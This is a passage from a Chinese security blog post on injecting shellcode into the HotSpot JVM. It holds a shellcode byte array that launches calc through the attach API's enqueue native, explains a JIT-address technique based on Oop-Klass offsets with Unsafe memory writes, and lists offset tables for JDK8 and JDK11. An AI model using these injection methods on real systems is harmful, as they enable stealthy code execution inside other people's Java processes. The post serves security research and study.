class="hljs-keyword">byte</span>) <span class="hljs-number">0x44</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x40</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xE3</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x56</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xFF</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x34</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x88</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD6</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4D</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xAC</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0D</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC1</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x38</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xE0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x75</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xF1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4C</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x03</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4C</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x24</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x08</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x45</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x39</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x75</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD8</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x44</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x40</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x24</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x66</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0C</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x44</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x40</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x1C</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x04</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x88</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5E</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x59</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5A</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x59</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5A</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x83</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xEC</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xFF</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xE0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x59</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5A</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x12</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xE9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x57</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xFF</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xFF</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xFF</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5D</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xBA</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8D</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8D</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xBA</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x6F</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x87</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xFF</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD5</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xBB</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xF0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xB5</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xA2</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x56</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xBA</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xA6</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x95</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xBD</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x9D</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xFF</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD5</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x83</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC4</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x28</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x3C</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x06</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x7C</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0A</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x80</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xFB</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xE0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x75</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x05</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xBB</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x47</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x13</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x72</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x6F</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x6A</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x59</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x89</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xDA</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xFF</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD5</span></span><br><span class="line">            &#125;;</span><br><span class="line">            ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            byteArrayOutputStream.write(buf);</span><br><span class="line">            byteArrayOutputStream.write(<span class="hljs-string">"calc\0"</span>.getBytes());</span><br><span class="line">            <span class="hljs-keyword">byte</span>[] result = byteArrayOutputStream.toByteArray();</span><br><span class="line"></span><br><span class="line">            Method method = clazz.getDeclaredMethod(<span class="hljs-string">"run"</span>, <span class="hljs-keyword">byte</span>[].class);</span><br><span class="line">            method.invoke(clazz, result);</span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ClassLoader</span> </span>&#123;</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">public</span> Class <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] bytes)</span> </span>&#123;</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.defineClass(bytes, <span class="hljs-number">0</span>, bytes.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> sun.tools.attach;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WindowsVirtualMachine</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">WindowsVirtualMachine</span><span class="hljs-params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title">enqueue</span><span class="hljs-params">(<span class="hljs-keyword">long</span> var0, <span class="hljs-keyword">byte</span>[] var2, String var3, String var4, Object... var5)</span> <span class="hljs-keyword">throws</span> IOException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">long</span> <span class="hljs-title">openProcess</span><span class="hljs-params">(<span class="hljs-keyword">int</span> var0)</span> <span class="hljs-keyword">throws</span> IOException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] buf)</span> </span>&#123;</span><br><span class="line">        System.loadLibrary(<span class="hljs-string">"attach"</span>);</span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">            enqueue(-<span class="hljs-number">1L</span>, buf, <span class="hljs-string">"test"</span>, <span class="hljs-string">"test"</span>);</span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (Exception var2) &#123;</span><br><span class="line">            var2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="基于oop偏移"><a href="#基于oop偏移" class="headerlink" title="基于oop偏移"></a>基于oop偏移</h2><p>这种是基于@Ryan Wincey和@xxDark两位前辈的总结，基本原理是：多次调用某个方法，使其成为热点代码触发即时编译，然后通过oop的数据结构偏移计算出JIT地址，最后使用Unsafe写内存的功能，将shellcode写入到JIT地址。其中涉及Unsafe、Oop-Klass模型和即时编译这三个前置知识。</p>
+<h3 id="Unsafe类"><a href="#Unsafe类" class="headerlink" title="Unsafe类"></a>Unsafe类</h3><p><code>Unsafe</code>类是java中非常特别的一个类，提供的操作可以直接读写内存、获得地址偏移值、锁定或释放线程。<code>Unsafe</code>只有一个私有的构造方法，但在类加载时候在静态代码中会实例化一个<code>Unsafe</code>对象，赋值给<code>Unsafe</code>类的静态常量<code>Unsafe</code>属性，我们反射获取到这个<code>Unsafe</code>属性即可。</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field field = Unsafe.class.getDeclaredField(<span class="hljs-string">"theUnsafe"</span>);</span><br><span class="line">field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">Unsafe unsafe = (Unsafe) field.get(<span class="hljs-keyword">null</span>);</span><br></pre></td></tr></table></figure>
+<p><code>Unsafe</code>读写内存的相关方法有<code>getObject</code>、<code>getAddress</code>、<code>getInt</code>、<code>getLong</code>和<code>putByte</code>等。</p>
+<h3 id="Oop-Klass模型"><a href="#Oop-Klass模型" class="headerlink" title="Oop-Klass模型"></a>Oop-Klass模型</h3><p>HotSpot JVM 底层都是 C/C++ 实现的，Java 对象在JVM的表示模型叫做“OOP-Klass”模型，包括两部分：</p>
+<ul>
+<li><p>OOP，即 Ordinary Object Point，普通对象指针，用来描述对象实例信息。</p>
+</li>
+<li><p>Klass，用来描述 Java 类，包含了元数据和方法信息等。</p>
+</li>
+</ul>
+<p>在Java程序运行过程中，每创建一个新的对象，在JVM内部就会相应地创建一个对应类型的OOP对象。Java类是对象，Java方法也是对象，而Java类加载完成时在JVM中的最终产物就是InstanceKlass，其中包含方法信息、字段信息等一切java 类所定义的一切元素。</p>
+<p><img src="/2022/03/22/JVM_Shellcode注入探索/截图20220315162807364.jpg" alt></p>
+<h3 id="即时编译（JIT）"><a href="#即时编译（JIT）" class="headerlink" title="即时编译（JIT）"></a>即时编译（JIT）</h3><blockquote>
+<p> 为了优化Java的性能 ，JVM在解释器之外引入了即时（Just In Time）编译器：当程序运行时，解释器首先发挥作用，代码可以直接执行；当方法或者代码块在一段时间内的调用次数超过了JVM设定的阈值时，这些字节码就会被编译成机器码，存入codeCache中。在下次执行时，再遇到这段代码，就会从codeCache中读取机器码，直接执行，以此来提升程序运行的性能。整体的执行过程大致如下图所示：</p>
+</blockquote>
+<p><img src="/2022/03/22/JVM_Shellcode注入探索/ba83857ecf9f344e4972fd551c4973d653952.png" alt></p>
+<p>Openjdk和Oracle JDK在默认mixed模式下会启动即时编译，即时编译的触发阈值在客户端编译器和服务端编译器上默认值分别为1500和10000。</p>
+<h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>在JVM的本体：jvm.dll和libjvm.so中，存在这一个<a href="https://github.com/openjdk/jdk/blob/0af356bb4bfee99223d4bd4f8b0001c5f362c150/src/hotspot/share/runtime/vmStructs.cpp" target="_blank" rel="noopener">VMStructs</a>的类，存储了JVM中包括oop、klass、constantPool在内的数据结构和他的属性。其中有使用<code>JNIEXPORT</code>标记的<code>VMStructs</code>、<code>VMTypes</code>、<code>IntConstants</code>和<code>LongConstants</code>的入口、名称、地址等偏移的变量，借助<code>ClassLoader</code>的内部类<code>NativeLibrary</code>的<code>find</code>或<code>findEntry</code>Native方法（与JDK的版本有关）,可获取到这些变量的值。</p>
+<p><img src="/2022/03/22/JVM_Shellcode注入探索/截图20220315195440905.jpg" alt></p>
+<p>然后通过<code>InstanceKlass</code>、<code>Array&lt;Method*&gt;</code>、<code>Method</code>、<code>ConstMethod</code>、<code>ConstantPool</code>、<code>Symbol</code>这些oop数据结构中的变量偏移计算出JIT的地址。</p>
+<p><img src="/2022/03/22/JVM_Shellcode注入探索/mermaid-diagram-20220322234434.png" alt></p>
+<p>我们要计算出的目标JIT地址是目标方法的JIT地址，这需要目标方法经多次调用触发即时编译，并自动赋值<code>_from_compiled_entry</code>结构成员，然后对比方法名和Signature，从目标类众多默认方法中过滤出目标方法来，再通过<code>Method</code>加上<code>_from_compiled_entry</code>偏移计算出来。（这里的Signature即形如<code>()V</code>、<code>(Ljava/lang/String;)V</code>、<code>()Ljava/lang/String;</code>的方法签名）</p>
+<p>上图没有提到<code>InstanceKlass</code>的获取，其实只要通过<code>Target.class</code>获取到目标类的类实例，再用Unsafe读取类实例加上<code>java_lang_Class</code>的<code>klass</code>偏移即可。</p>
+<p><img src="/2022/03/22/JVM_Shellcode注入探索/截图20220316105040869.jpg" alt></p>
+<p>JVM的JIT在内存中是一个可读可写可执行的区域，最后使用<code>Unsafe</code>的<code>putByte</code>方法写入shellcode，再调用目标方法即可执行。这里要注意的是，如果使用没有恢复现场，即破坏了原有栈帧的shellcode，<strong>会导致JVM奔溃，切勿在生产环境上测试</strong>。</p>
+<p><img src="/2022/03/22/JVM_Shellcode注入探索/截图20220315205923708.jpg" alt></p>
+<p>以上的Demo代码可以@xxDark的<a href="https://github.com/xxDark/JavaShellcodeInjector" target="_blank" rel="noopener"> JavaShellcodeInjector</a>项目中浏览。</p>
+<h3 id="部分问题修复及改进"><a href="#部分问题修复及改进" class="headerlink" title="部分问题修复及改进"></a>部分问题修复及改进</h3><p>在32位的JDK跑Demo，JRE会抛出个异常，调试发现从目标类实例获取<code>InstanceKlass</code>的偏移：klassOffset，从内存取到的值是0，使得获取到的<code>klass</code>不正确，导致Unsafe读取了一个异常的地址。</p>
+<p><img src="/2022/03/22/JVM_Shellcode注入探索/截图20220316102851189.jpg" alt></p>
+<p>问题的原因目前还不得而知，但通过HSDB找到<code>java.lang.Class</code>的<code>InstanceKlass</code>就可以看到<code>klass</code>的偏移，后续其他自动获取的偏移也没有出现异常。</p>
+<p><img src="/2022/03/22/JVM_Shellcode注入探索/截图20220316103424323.jpg" alt></p>
+<p>上面自动化地计算偏移，要加载JVM的链接库，还要获取一堆JVM里的数据结构、记录一堆oop和常量池的值，这要是想将POC写成一个文件着实有点不方便啊。那有没有一种简单粗暴的方法呢？</p>
+<p>答案是肯定的。笔者刚好装有多个版本的JDK，发现JDK大版本和位数相同的时候，上面那些偏移是不变的。翻看JDK的源码不难发现，这些offset归根结底是由<code>offset_of</code>宏得出，一个与C语言<code>offsetof</code>作用相同的宏，结果是一个结构成员相对于结构开头的字节偏移量。</p>
+<p><img src="/2022/03/22/JVM_Shellcode注入探索/截图20220316112536664.jpg" alt></p>
+<p>而通过之前查阅的资料得知，不同JDK大版本之间的oop数据结构才存在差异，我们只要记录下这些相同架构和大版本的偏移，就能直接计算出JIT的地址，可以免去加载JVM链接库和收集、存储JVM里数据结构的操作。</p>
+<p>以下是笔者收集的部分LTS版本JDK的oop相关偏移：</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">//        JDK8 x32</span><br><span class="line">static int klassOffset = 0x44;</span><br><span class="line">static int methodArrayOffset = 0xe4;</span><br><span class="line">static int methodsOffset = 0x4;</span><br><span class="line">static int constMethodOffset = 0x4;</span><br><span class="line">static int constantPoolTypeSize = 0x2c;</span><br><span class="line">static int constantPoolOffset = 0x8;</span><br><span class="line">static int nameIndexOffset = 0x1a;</span><br><span class="line">static int signatureIndexOffset = 0x1c;</span><br><span class="line">static int _from_compiled_entry = 0x24;</span><br><span class="line">static int symbolTypeBodyOffset = 0x8;</span><br><span class="line">static int symbolTypeLengthOffset = 0x0;</span><br><span class="line"></span><br><span class="line">//        JDK8 x64</span><br><span class="line">static int klassOffset = 0x48;</span><br><span class="line">static int methodArrayOffset = 0x180;</span><br><span class="line">static int methodsOffset = 0x8;</span><br><span class="line">static int constMethodOffset = 0x8;</span><br><span class="line">static int constantPoolTypeSize = 0x50;</span><br><span class="line">static int constantPoolOffset = 0x8;</span><br><span class="line">static int nameIndexOffset = 0x22;</span><br><span class="line">static int signatureIndexOffset = 0x24;</span><br><span class="line">static int _from_compiled_entry = 0x40;</span><br><span class="line">static int symbolTypeBodyOffset = 0x8;</span><br><span class="line">static int symbolTypeLengthOffset = 0x0;</span><br><span class="line"></span><br><span class="line">//        JDK11 x64</span><br><span class="line">static int klassOffset = 0x50;</span><br><span class="line">static int methodArrayOffset = 0x198;</span><br><span class="line">static int methodsOffset = 0x8;</span><br><span class="line">static int constMethodOffset = 0x8;</span><br><span class="line">static int constantPoolTypeSize = 0x40;</span><br><span class="line">static int constantPoolOffset = 0x8;</span><br><span class="line">static int nameIndexOffset = 0x2a;</span><br><span class="line">static int signatureIndexOffset = 0x2c;</span><br><span class="line">static int _from_compiled_entry = 0x38;</span><br><span class="line">static int symbolTypeBodyOffset = 0x6;</span><br><span class="line">static int symbolTypeLengthOffset = 0x0;</span><br></pre></td></tr></table></figure>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>笔者在JDK7也曾尝试注入shellcode，但最后还是以失败告终，不仅是因为JDK7到JDK8的oop数据结构发生了很大的变化，而且JDK7中的类示例中并没有<code>InstanceKlass</code>结构成员，但<code>java_lang_CLass</code>中又确确实实存在<code>_klass_offset</code>这个结构成员，这点就比较奇怪。</p>
+<p><img src="/2022/03/22/JVM_Shellcode注入探索/截图20220316120624000.jpg" alt></p>
+<p>翻看官方工具HSDB源码，发现它是通过<code>BasicHashtable&lt;mtInternal&gt;</code>的<code>_buckets</code>结构成员获取所有<code>InstanceKlass</code>的。由于JDK7上POC的oop数据结构需要改动较多，且还不知道<code>BasicHashtable&lt;mtInternal&gt;</code>要怎么获取，所以JDK7下的POC还未实现。</p>
+<p>最后两个的shellcode注入方法基于Oracle JDK和Openjdk的默认JVM：HotSpot，其他一些的JVM的实现方法就要静待各位师傅发掘。</p>
+<p>文中若有错误的地方，望各位师傅不吝斧正。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/10075" target="_blank" rel="noopener">https://xz.aliyun.com/t/10075</a></p>
+<p><a href="https://www.slideshare.net/RyanWincey/java-shellcodeoffice" target="_blank" rel="noopener">https://www.slideshare.net/RyanWincey/java-shellcodeoffice</a></p>
+<p><a href="https://github.com/xxDark/JavaShellcodeInjector/blob/master/src/main/java/me/xdark/shell/ShellcodeRunner.java" target="_blank" rel="noopener">https://github.com/xxDark/JavaShellcodeInjector/blob/master/src/main/java/me/xdark/shell/ShellcodeRunner.java</a></p>
+<p><a href="https://qiankunli.github.io/2014/10/27/jvm_classloader.html" target="_blank" rel="noopener">https://qiankunli.github.io/2014/10/27/jvm_classloader.html</a></p>
+<p><a href="https://www.sczyh30.com/posts/Java/jvm-klass-oop/" target="_blank" rel="noopener">https://www.sczyh30.com/posts/Java/jvm-klass-oop/</a></p>
+<p><a href="https://jishuin.proginn.com/p/763bfbd58ef3" target="_blank" rel="noopener">https://jishuin.proginn.com/p/763bfbd58ef3</a></p>
+<p><a href="https://tech.meituan.com/2020/10/22/java-jit-practice-in-meituan.html" target="_blank" rel="noopener">https://tech.meituan.com/2020/10/22/java-jit-practice-in-meituan.html</a></p>
+
+        </div>
+        
+            <ul class="post-copyright">
+            <li><strong>本文标题：</strong><a href="https://blog.play2win.top/2022/03/22/JVM_Shellcode注入探索/">JVM Shellcode注入探索</a></li>
+            <li><strong>本文作者：</strong><a href="https://blog.play2win.top">P1ay2win</a></li>
+            <li><strong>本文链接：</strong><a href="https://blog.play2win.top/2022/03/22/JVM_Shellcode注入探索/">https://blog.play2win.top/2022/03/22/JVM_Shellcode注入探索/</a></li>
+            <li><strong>发布时间：</strong>2022-03-22</li>
